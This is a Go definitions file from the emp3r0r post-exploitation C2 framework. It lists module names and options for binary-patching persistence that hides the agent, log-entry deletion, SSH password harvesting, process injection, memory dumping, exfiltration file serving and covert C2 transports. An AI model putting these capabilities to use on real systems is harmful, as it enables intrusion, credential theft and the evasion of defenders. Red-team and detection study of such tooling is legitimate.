package emp3r0r_def

import "fmt"

// built-in module names
const (
	ModGenAgent     = "gen_agent"
	ModCMD_EXEC     = "cmd_exec"
	ModCLEAN_LOG    = "clean_log"
	ModLPE_SUGGEST  = "lpe_suggest"
	ModPERSISTENCE  = "get_persistence"
	ModPROXY        = "run_proxy"
	ModPORT_FWD     = "port_fwd"
	ModSHELL        = "interactive_shell"
	ModVACCINE      = "vaccine"
	ModINJECTOR     = "injector"
	ModBring2CC     = "bring2cc"
	ModListener     = "listener"
	ModSSHHarvester = "ssh_harvester"
	ModFileServer   = "file_server"
	ModDownloader   = "file_downloader"
	ModMemDump      = "mem_dump"
)

// PersistMethods CC calls one of these methods to get persistence, or all of them at once
var PersistMethods = map[string]string{
	"profiles": "Add some aliases to shell profiles, will trigger when user logs in",
	"cron":     "Add a cronjob",
	"patcher":  "Patch binaries (ls, ps, pstree, sshd, bash, sh...) so they load loader.so on startup, it also make emp3r0r essentially invisible to those tools",
}

var InjectorMethods = map[string]string{
	"shellcode":      "Inject shellcode (see wiki), if no shellcode is specified, it will inject guardian.asm (runs emp3r0r as child process)",
	"shared_library": "Inject a shared library, if no library is specified, it will inject loader.so (ELF loader that runs emp3r0r agent)",
}

// ModOption represents module options
type ModOption struct {
	OptName string   `json:"opt_name"` // option name
	OptDesc string   `json:"opt_desc"` // option description
	OptVal  string   `json:"opt_val"`  // option value
	OptVals []string `json:"opt_vals"` // option value candidates
}

// ModOptions represents multiple module options
type ModOptions map[string]*ModOption

// AgentModuleConfig stores configuration data for the agent side
type AgentModuleConfig struct {
	Exec          string   `json:"exec"`        // Run this executable file on agent
	Files         []string `json:"files"`       // Files to be uploaded to agent
	InMemory      bool     `json:"in_memory"`   // run this module in memory
	Type          string   `json:"type"`        // "go", "python", "powershell", "bash", "exe", "elf", "dll", "so"
	IsInteractive bool     `json:"interactive"` // whether run as a shell or not, eg. python, bettercap
}

// ModuleConfig stores the complete module config data
type ModuleConfig struct {
	Name        string            `json:"name"`         // Display as this name
	Build       string            `json:"build"`        // Command to run on C2, you can use it to build module
	Author      string            `json:"author"`       // by whom
	Date        string            `json:"date"`         // when did you write it
	Comment     string            `json:"comment"`      // describe your module in one line
	IsLocal     bool              `json:"is_local"`     // If true, this module is a C2 plugin and doesn't run on agent, use `Build` to specify the command to run
	Platform    string            `json:"platform"`     // targeting which OS? Linux/Windows
	Path        string            `json:"path"`         // Path to the module directory
	Options     ModOptions        `json:"options"`      // module options, will be passed as environment variables to the module, either on C2 or agent side
	AgentConfig AgentModuleConfig `json:"agent_config"` // Configuration for agent side
}

// Module help info and options
var Modules = map[string]*ModuleConfig{
	ModVACCINE: {
		Name:     ModVACCINE,
		Build:    "",
		Author:   "jm33-ng",
		Date:     "2020-01-25",
		Comment:  "Install tools to RuntimeConfig.UtilsPath, for lateral movement",
		IsLocal:  false,
		Platform: "Linux",
		Path:     "",
		Options: ModOptions{
			"download_addr": &ModOption{
				OptName: "download_addr",
				OptDesc: "Download address, useful if you want to download from other agents, use `file_server` first, eg. 10.1.1.1:8000",
				OptVal:  "",
			},
		},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: false,
		},
	},
	ModGenAgent: {
		Name:     ModGenAgent,
		Build:    "",
		Author:   "jm33-ng",
		Date:     "2020-01-25",
		Comment:  "Build agent for different OS/arch with customized options",
		IsLocal:  true,
		Platform: "Generic",
		Path:     "",
		Options: ModOptions{
			"payload_type": &ModOption{
				OptName: "payload_type",
				OptDesc: `Target OS and payload_type, eg. "linux_executable", "windows_dll", "windows_exeuatable", "linux_so"`,
				OptVals: []string{"linux_executable", "windows_dll", "windows_exeuatable", "linux_so"},
				OptVal:  "linux_executable",
			},
			"arch": &ModOption{
				OptName: "arch",
				OptDesc: "Target architecture, available arch: amd64, 386, arm, arm64, etc",
				OptVal:  "amd64",
			},
			"cc_host": &ModOption{
				OptName: "cc_host",
				OptDesc: "CC host (IP/domain name)",
			},
			"cc_indicator": &ModOption{
				OptName: "cc_indicator",
				OptDesc: "Agents will check this URL before making connection to CC server, eg. https://github.com/xxx/xxx/releases/download/xxx/xx.txt",
			},
			"indicator_text": &ModOption{
				OptName: "indicator_text",
				OptDesc: "Text to check, eg. emp3r0r",
			},
			"ncsi": &ModOption{
				OptName: "ncsi",
				OptDesc: "Use NCSI (Network Connectivity Status Indicator) to check internet access",
			},
			"cdn_proxy": &ModOption{
				OptName: "cdn_proxy",
				OptDesc: "Use CDN as C2 transport, eg. wss://yourcdn.com/yourpath",
			},
			"shadowsocks": &ModOption{
				OptName: "shadowsocks",
				OptDesc: "Use shadowsocks as C2 transport, KCP (fast UDP tunnel) is enabled by default",
				OptVal:  "on",
				OptVals: []string{"on", "bare", "off"},
			},
			"c2transport_proxy": &ModOption{
				OptName: "c2transport_proxy",
				OptDesc: "Use a proxy for C2 transport, eg. socks5://127.0.0.1:9050",
			},
			"auto_proxy": &ModOption{
				OptName: "auto_proxy",
				OptDesc: "Use auto proxy server: enable UDP broadcast to form a Shadowsocks proxy chain to automatically bring agents to CC",
			},
			"autoproxy_timeout": &ModOption{
				OptName: "autoproxy_timeout",
				OptDesc: "Auto proxy timeout in seconds",
				OptVal:  "0",
			},
			"doh_server": &ModOption{
				OptName: "doh_server",
				OptDesc: "Use DNS over HTTPS (DoH) for DNS, eg. https://1.1.1.1/dns-query",
				OptVal:  "",
				OptVals: []string{"https://1.1.1.1/dns-query"},
			},
		},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: false,
		},
	},
	ModCMD_EXEC: {
		Name:     ModCMD_EXEC,
		Build:    "",
		Author:   "jm33-ng",
		Date:     "2020-01-25",
		Comment:  "Run a single command on one or more targets",
		IsLocal:  false,
		Platform: "Generic",
		Path:     "",
		Options: ModOptions{
			"cmd_to_exec": &ModOption{
				OptName: "cmd_to_exec",
				OptDesc: "Press TAB for some hints",
				OptVals: []string{
					"id", "whoami", "ifconfig",
					"ip a", "arp -a",
					"ps -ef", "lsmod", "ss -antup",
					"netstat -antup", "uname -a",
				},
			},
		},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: false,
		},
	},
	ModCLEAN_LOG: {
		Name:     ModCLEAN_LOG,
		Build:    "",
		Author:   "jm33-ng",
		Date:     "2020-01-25",
		Comment:  "Delete lines containing keyword from xtmp logs",
		IsLocal:  false,
		Platform: "Linux",
		Path:     "",
		Options: ModOptions{
			"keyword": &ModOption{
				OptName: "keyword",
				OptDesc: "Delete all log entries containing this keyword",
				OptVals: []string{"root", "admin"},
				OptVal:  "root",
			},
		},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: false,
		},
	},
	ModLPE_SUGGEST: {
		Name:     ModLPE_SUGGEST,
		Build:    "",
		Author:   "jm33-ng",
		Date:     "2020-01-25",
		Comment:  "Run linux-smart-enumeration or linux exploit suggester",
		IsLocal:  false,
		Platform: "Generic",
		Path:     "",
		Options: ModOptions{
			"lpe_helper": &ModOption{
				OptName: "lpe_helper",
				OptDesc: "Which LPE helper to use, available helpers: lpe_les (Linux exploit suggester), lpe_lse (Linux smart enumeration), lpe_linpeas (PEASS-ng, works on Linux), lpe_winpeas (PEASS-ng, works on Windows",
				OptVals: []string{"lpe_les", "lpe_lse", "lpe_linpeas", "lpe_winpeas"},
				OptVal:  "lpe_les",
			},
		},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: false,
		},
	},
	ModPERSISTENCE: {
		Name:     ModPERSISTENCE,
		Build:    "",
		Author:   "jm33-ng",
		Date:     "2020-01-25",
		Comment:  "Get persistence via built-in methods",
		IsLocal:  false,
		Platform: "Linux",
		Path:     "",
		Options: ModOptions{
			"method": &ModOption{
				OptName: "method",
				OptDesc: fmt.Sprintf("Persistence method: profiles: %s; cron: %s; patcher: %s", PersistMethods["profiles"], PersistMethods["cron"], PersistMethods["patcher"]),
				OptVals: []string{"profiles", "cron", "patcher"},
				OptVal:  "patcher",
			},
		},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: false,
		},
	},
	ModPROXY: {
		Name:     ModPROXY,
		Build:    "",
		Author:   "jm33-ng",
		Date:     "2020-01-25",
		Comment:  "Start a socks proxy on target host",
		IsLocal:  false,
		Platform: "Generic",
		Path:     "",
		Options: ModOptions{
			"port": &ModOption{
				OptName: "port",
				OptDesc: "Port of our local proxy server",
				OptVals: []string{"1080", "8080", "10800", "10888"},
				OptVal:  "8080",
			},
			"status": &ModOption{
				OptName: "status",
				OptDesc: "Turn proxy on/off",
				OptVals: []string{"on", "off", "reverse"},
				OptVal:  "on",
			},
		},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: false,
		},
	},
	ModPORT_FWD: {
		Name:     ModPORT_FWD,
		Build:    "",
		Author:   "jm33-ng",
		Date:     "2020-01-25",
		Comment:  "Port mapping from agent to CC",
		IsLocal:  false,
		Platform: "Generic",
		Path:     "",
		Options: ModOptions{
			"to": &ModOption{
				OptName: "to",
				OptDesc: "Address:Port (to forward to) on agent/CC side",
				OptVals: []string{"127.0.0.1:22", "127.0.0.1:8080"},
			},
			"listen_port": &ModOption{
				OptName: "listen_port",
				OptDesc: "Listen port on CC/agent side",
				OptVals: []string{"8080", "1080", "22", "23", "21"},
			},
			"switch": &ModOption{
				OptName: "switch",
				OptDesc: "Turn port mapping on/off, or use `reverse` mapping",
				OptVals: []string{"on", "off", "reverse"},
				OptVal:  "on",
			},
			"protocol": &ModOption{
				OptName: "protocol",
				OptDesc: "Forward to TCP or UDP port on agent side",
				OptVals: []string{"tcp", "udp"},
				OptVal:  "tcp",
			},
		},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: false,
		},
	},
	ModSHELL: {
		Name:     ModSHELL,
		Build:    "",
		Author:   "jm33-ng",
		Date:     "2020-01-25",
		Comment:  "Bring your own shell program to run on target",
		IsLocal:  false,
		Platform: "Generic",
		Path:     "",
		Options: ModOptions{
			"shell": &ModOption{
				OptName: "shell",
				OptDesc: "Shell program to run, eg. /bin/bash. Please use `elvish` module or upload a custom shell for opsec reasons. Default `bash` shell can be installed via module `vaccine`",
				OptVals: []string{
					"/bin/bash", "/bin/zsh", "/bin/sh", "python", "python3",
					"cmd.exe", "powershell.exe", "elvish",
				},
				OptVal: "bash",
			},
			"args": &ModOption{
				OptName: "args",
				OptDesc: "Command line args of the shell program",
				OptVal:  "",
			},
			"port": &ModOption{
				OptName: "port",
				OptDesc: "The (sshd) port that our shell will be using",
				OptVals: []string{
					"22222",
				},
				OptVal: "22222",
			},
		},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: true,
		},
	},
	ModINJECTOR: {
		Name:     ModINJECTOR,
		Build:    "",
		Author:   "jm33-ng",
		Date:     "2020-01-25",
		Comment:  "Inject shellcode/loader.so into a running process",
		IsLocal:  false,
		Platform: "Linux",
		Path:     "",
		Options: ModOptions{
			"pid": &ModOption{
				OptName: "pid",
				OptDesc: "Target process PID, set to 0 to start a new process (sleep)",
				OptVals: []string{"0"},
				OptVal:  "0",
			},
			"method": &ModOption{
				OptName: "method",
				OptDesc: fmt.Sprintf("Injection method, available methods: shellcode: %s; shared_library: %s", InjectorMethods["shellcode"], InjectorMethods["shared_library"]),
				OptVals: []string{"shellcode", "shared_library"},
				OptVal:  "shared_library",
			},
		},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: false,
		},
	},
	ModBring2CC: {
		Name:     ModBring2CC,
		Build:    "",
		Author:   "jm33-ng",
		Date:     "2020-01-25",
		Comment:  "Bring arbitrary agent to CC",
		IsLocal:  false,
		Platform: "Generic",
		Path:     "",
		Options: ModOptions{
			"addr": &ModOption{
				OptName: "addr",
				OptDesc: "Target host to proxy, we will connect to it and proxy it out",
				OptVals: []string{"127.0.0.1"},
				OptVal:  "<blank>",
			},
			"kcp": &ModOption{
				OptName: "kcp",
				OptDesc: "Use KCP (fast UDP tunnel) for proxy",
				OptVals: []string{"on", "off"},
				OptVal:  "on",
			},
		},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: false,
		},
	},
	ModListener: {
		Name:     ModListener,
		Build:    "",
		Author:   "jm33-ng",
		Date:     "2020-01-25",
		Comment:  "Start a listener to serve stagers or regular files",
		IsLocal:  false,
		Platform: "Generic",
		Path:     "",
		Options: ModOptions{
			"payload": &ModOption{
				OptName: "payload",
				OptDesc: "The payload to serve, eg. ./stager",
			},
			"listener": &ModOption{
				OptName: "listener",
				OptDesc: "Listener type, eg. http_bare, http_aes_compressed",
			},
			"port": &ModOption{
				OptName: "port",
				OptDesc: "Port to listen on, eg. 8080",
			},
		},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: false,
		},
	},
	ModSSHHarvester: {
		Name:     ModSSHHarvester,
		Build:    "",
		Author:   "jm33-ng",
		Date:     "2020-01-25",
		Comment:  "Harvest clear-text password automatically from OpenSSH server process",
		IsLocal:  false,
		Platform: "Linux",
		Path:     "",
		Options:  ModOptions{},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: false,
		},
	},
	ModFileServer: {
		Name:     ModFileServer,
		Build:    "",
		Author:   "jm33-ng",
		Date:     "2020-01-25",
		Comment:  "Start a secure file server on target host for data exfiltration and module file caching",
		IsLocal:  false,
		Platform: "Generic",
		Path:     "",
		Options: ModOptions{
			"port": &ModOption{
				OptName: "port",
				OptDesc: "Port to listen on",
				OptVal:  "8000",
			},
			"switch": &ModOption{
				OptName: "switch",
				OptDesc: "Turn file server on/off",
				OptVal:  "on",
			},
		},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: false,
		},
	},
	ModDownloader: {
		Name:     ModDownloader,
		Build:    "",
		Author:   "jm33-ng",
		Date:     "2020-01-25",
		Comment:  "Download and decrypt a file from other agents, run `file_server` first",
		IsLocal:  false,
		Platform: "Generic",
		Path:     "",
		Options: ModOptions{
			"download_addr": &ModOption{
				OptName: "download_addr",
				OptDesc: "Download address, eg 10.1.1.1:8000",
				OptVal:  "",
			},
			"path": &ModOption{
				OptName: "path",
				OptDesc: "Path to the file (on server) to download, eg. /tmp/agent.exe",
				OptVal:  "",
			},
			"checksum": &ModOption{
				OptName: "checksum",
				OptDesc: "SHA256 checksum of the file, used to verify integrity, wont't check if empty",
				OptVal:  "",
			},
		},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: false,
		},
	},
	ModMemDump: {
		Name:     ModMemDump,
		Build:    "",
		Author:   "jm33-ng",
		Date:     "2020-01-25",
		Comment:  "Dump memory regions of a process",
		IsLocal:  false,
		Platform: "Generic",
		Path:     "",
		Options: ModOptions{
			"pid": &ModOption{
				OptName: "pid",
				OptDesc: "PID of the target process",
				OptVal:  "",
			},
		},
		AgentConfig: AgentModuleConfig{
			Exec:          "built-in",
			Files:         []string{},
			InMemory:      false,
			Type:          "go",
			IsInteractive: false,
		},
	},
}
